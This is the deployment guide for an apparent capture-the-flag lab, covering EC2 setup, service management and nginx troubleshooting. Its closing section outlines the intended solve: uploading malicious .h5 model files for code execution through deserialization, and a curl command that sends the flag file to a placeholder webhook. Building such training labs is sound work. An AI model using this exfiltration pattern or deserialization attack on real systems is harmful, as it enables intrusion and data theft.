# Mind Flayer Model Lab - EC2 Deployment Guide

## 🚀 Quick EC2 Deployment

### Prerequisites
- EC2 instance running Ubuntu 20.04+ or Amazon Linux 2
- At least 2GB RAM (recommended for TensorFlow)
- Security group allowing HTTP (port 80) and SSH (port 22)

### 1. Upload Files to EC2
```bash
# On your local machine
scp -i your-key.pem -r "Mind Flayer Model Lab" ubuntu@your-ec2-ip:/tmp/
```

### 2. SSH into EC2 and Deploy
```bash
ssh -i your-key.pem ubuntu@your-ec2-ip
cd "/tmp/Mind Flayer Model Lab"
sudo chmod +x deploy-ec2.sh setup-services.sh
sudo ./deploy-ec2.sh
sudo ./setup-services.sh
```

### 3. Access Your CTF
Open your browser and go to: `http://your-ec2-public-ip`

## 🔧 Manual Commands

### Check Service Status
```bash
sudo systemctl status mindflayer
sudo systemctl status nginx
```

### View Logs
```bash
sudo journalctl -fu mindflayer
sudo tail -f /var/log/nginx/access.log
```

### Restart Services
```bash
sudo systemctl restart mindflayer
sudo systemctl restart nginx
```

## 🛡️ Security Features

- ✅ Runs as non-root user (`ctfuser`)
- ✅ Flag file is read-only and immutable
- ✅ Nginx reverse proxy with security headers
- ✅ File upload size limits
- ✅ Service isolation with systemd

## 🏗️ Architecture

```
Internet → EC2 Security Group → Nginx (Port 80) → Gunicorn (Port 8000) → Flask App
```

## 📊 Monitoring

Health check endpoint: `http://your-ec2-ip/health`

## 🔥 Troubleshooting

### App won't start
```bash
sudo journalctl -fu mindflayer
# Check for missing dependencies or permission issues
```

### Nginx errors
```bash
sudo nginx -t
sudo tail -f /var/log/nginx/error.log
```

### Port issues
```bash
sudo netstat -tlnp | grep :80
sudo netstat -tlnp | grep :8000
```

## 🎯 CTF Access

Once deployed, participants can:
1. Visit the web interface
2. Upload malicious `.h5` model files
3. Achieve RCE through model deserialization
4. Execute: `curl your-webhook.com?flag=$(cat flag.txt)`

The flag file is protected against overwriting! 🛡️